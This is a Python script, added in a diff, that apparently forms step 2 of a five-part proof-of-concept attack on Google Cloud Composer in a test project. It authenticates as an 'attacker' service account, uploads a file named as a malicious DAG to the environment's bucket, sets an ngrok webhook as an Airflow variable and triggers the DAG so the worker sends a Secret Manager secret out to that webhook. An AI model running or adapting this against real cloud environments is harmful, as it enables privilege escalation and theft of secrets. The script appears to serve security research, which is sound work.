@@ -1,0 +1,171 @@
+import os
+import sys
+import time
+import subprocess
+import requests
+
+PROJECT_ID = "poc-tfm-tests"
+REGION = "us-central1"
+ENV_NAME = "tfm-composer-env"
+DAG_NAME = "persistent_escalated_dag"
+
+# SAs/keys
+PRIV_SA_EMAIL = "internal-support@poc-tfm-tests.iam.gserviceaccount.com"
+PRIV_SA_KEY   = "internal-support-key.json"
+ATT_SA_EMAIL  = "composer-payload-attacker@poc-tfm-tests.iam.gserviceaccount.com"
+ATT_SA_KEY    = "composer-payload-attacker.json"
+
+# Rutas absolutas
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+DAG_DIR = os.path.join(SCRIPT_DIR, "dag")
+TEMPLATE_PATH = os.path.join(DAG_DIR, "malicious_dag_external.py.template")
+DAG_OUTPUT_PATH = os.path.join(DAG_DIR, "malicious_dag_external.py")
+
+SECRET_NAME = "test-secret"  # el que creaste en 1_create_env.py
+
+def run(cmd, check=True, capture=False):
+    print(f"[+] {cmd}")
+    if capture:
+        p = subprocess.run(cmd, shell=True, text=True,
+                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if check and p.returncode != 0:
+            print(p.stderr.strip())
+            sys.exit(1)
+        return p
+    else:
+        p = subprocess.run(cmd, shell=True)
+        if check and p.returncode != 0:
+            sys.exit(1)
+        return p
+
+def auth_sa(email, key):
+    run(f"gcloud auth activate-service-account {email} --key-file={key} --project={PROJECT_ID}")
+
+def get_dag_bucket():
+    r = run(
+        f"gcloud composer environments describe {ENV_NAME} "
+        f"--location={REGION} --project={PROJECT_ID} "
+        f"--format='value(config.dagGcsPrefix)'",
+        capture=True
+    )
+    dag_prefix = (r.stdout or "").strip()
+    if not dag_prefix:
+        print("[!] No pude resolver dagGcsPrefix.")
+        sys.exit(1)
+    return dag_prefix.replace('gs://', '').split('/')[0]
+
+def prepare_template_if_missing():
+    os.makedirs(DAG_DIR, exist_ok=True)
+    if not os.path.isfile(TEMPLATE_PATH):
+        print(f"[!] Falta template: {TEMPLATE_PATH}")
+        sys.exit(1)
+
+    # Copia 1:1 a la salida (aquí podrías parametrizar si quisieras)
+    with open(TEMPLATE_PATH, "r") as f:
+        code = f.read()
+    with open(DAG_OUTPUT_PATH, "w") as f:
+        f.write(code)
+    print(f"[✓] DAG listo en: {DAG_OUTPUT_PATH}")
+
+def upload_dag(bucket):
+    run(f"gsutil -o GSUtil:default_project_id={PROJECT_ID} cp '{DAG_OUTPUT_PATH}' gs://{bucket}/dags/")
+    try:
+        os.remove(DAG_OUTPUT_PATH)
+    except FileNotFoundError:
+        pass
+    print("[✓] DAG subido.")
+
+def get_ngrok_https_url():
+    try:
+        tunnels = requests.get("http://localhost:4040/api/tunnels", timeout=3).json().get("tunnels", [])
+        url = [t["public_url"] for t in tunnels if t.get("proto") == "https"][0]
+        print(f"[✓] WEBHOOK_URL = {url}")
+        return url
+    except Exception as e:
+        print(f"[!] No pude obtener URL de ngrok: {e}")
+        print("    Asegúrate de tener `ngrok http 8080` ejecutándose.")
+        sys.exit(1)
+
+def wait_env_running(timeout=240, poll=5):
+    print("[*] Esperando a que el entorno esté RUNNING…")
+    start = time.time()
+    while time.time() - start < timeout:
+        r = subprocess.run(
+            ["gcloud","composer","environments","describe",ENV_NAME,
+             f"--location={REGION}",f"--project={PROJECT_ID}","--format=value(state)"],
+            text=True, stdout=subprocess.PIPE
+        )
+        state = (r.stdout or "").strip()
+        print(f"    state={state}", end="\r")
+        if state == "RUNNING":
+            print("\n[✓] RUNNING")
+            return
+        time.sleep(poll)
+    print("\n[i] Timeout; seguimos igualmente.")
+
+def set_airflow_vars(webhook_url):
+    # Estas dos variables son las que usa el DAG
+    pairs = {
+        "WEBHOOK_URL": webhook_url,
+        "SECRET_NAME": SECRET_NAME,
+        "GCP_PROJECT": PROJECT_ID,   # fallback para el DAG si no resuelve via google.auth
+    }
+    for k,v in pairs.items():
+        for left in range(12, 0, -1):  # ~2 min
+            r = subprocess.run([
+                "gcloud","composer","environments","run",ENV_NAME,
+                "--location",REGION,"--project",PROJECT_ID,
+                "variables","set","--",k,str(v)
+            ])
+            if r.returncode == 0:
+                print(f"[✓] Airflow Var {k} = {v}")
+                break
+            time.sleep(10)
+        else:
+            print(f"[!] No pude setear {k}")
+            sys.exit(1)
+
+def unpause_and_trigger():
+    subprocess.run([
+        "gcloud","composer","environments","run",ENV_NAME,
+        "--location",REGION,"--project",PROJECT_ID,
+        "dags","unpause","--",DAG_NAME
+    ])  # idempotente
+
+    run(
+        f"gcloud composer environments run {ENV_NAME} "
+        f"--location={REGION} --project={PROJECT_ID} "
+        f"dags trigger -- {DAG_NAME}"
+    )
+    print("[✓] DAG disparado.")
+
+def list_tasks():
+    subprocess.run([
+        "gcloud","composer","environments","run",ENV_NAME,
+        "--location",REGION,"--project",PROJECT_ID,
+        "tasks","list","--",DAG_NAME
+    ])
+
+def main():
+    print("[2/5] Desplegando DAG de demo (sin payload externo)…")
+
+    # Subimos el DAG con la SA "atacante" (permiso GCS) – opcionalmente podrías usar la privilegiada
+    auth_sa(ATT_SA_EMAIL, ATT_SA_KEY)
+    prepare_template_if_missing()
+    bucket = get_dag_bucket()
+    upload_dag(bucket)
+
+    # Obtenemos webhook y cambiamos a la SA privilegiada para operar el control-plane
+    webhook_url = get_ngrok_https_url()
+    auth_sa(PRIV_SA_EMAIL, PRIV_SA_KEY)
+
+    wait_env_running()
+    set_airflow_vars(webhook_url)
+    unpause_and_trigger()
+    list_tasks()
+
+    print("[i] Revisa el webhook/Cloud Logging. Si el worker SA tiene secretAccessor y la lib está instalada, verás el secreto.")
+    print("[✓] Demo desplegada.")
+
+if __name__ == "__main__":
+    main()
